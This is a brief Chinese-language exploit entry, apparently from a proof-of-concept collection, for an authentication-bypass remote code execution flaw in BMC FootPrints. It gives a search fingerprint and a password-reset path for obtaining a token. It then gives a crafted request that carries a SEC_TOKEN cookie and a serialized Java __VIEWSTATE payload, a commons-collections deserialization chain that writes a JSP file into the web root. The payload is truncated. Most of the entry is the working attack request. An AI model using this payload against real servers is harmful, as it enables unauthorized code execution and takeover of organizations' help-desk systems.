# BMCFootprints存在认证绕过RCE漏洞

- **系统**：BMCFootprints　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`icon_hash="-1106787596"`
- **请求**：`GET /footprints/servicedesk/passwordreset/request/ HTTP/1.1`

**请求体 / payload**
```
**获取sec_token**
Host:
**利用SEC_TOEKN实现文件写入**
GET /footprints/servicedesk/aspnetconfig?__VIEWSTATE=helloworld HTTP/1.1
Host:
Cookie: SEC_TOKEN=i9c7QzGbfOUs7CYcS-cq&NSuBUaViWX2wD5sflCO5j+c1ATrdX
Content-Type: application/x-www-form-urlencoded
Content-Length: 1514
__VIEWSTATE=rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI%2FQAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAGndlYmFwcHMvUk9PVC9WOWhMY1lGMEEuanNwc3IAKm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5tYXAuTGF6e…（脚本共 1818 字，完整版见原文）
```
- **预期**：200　|　—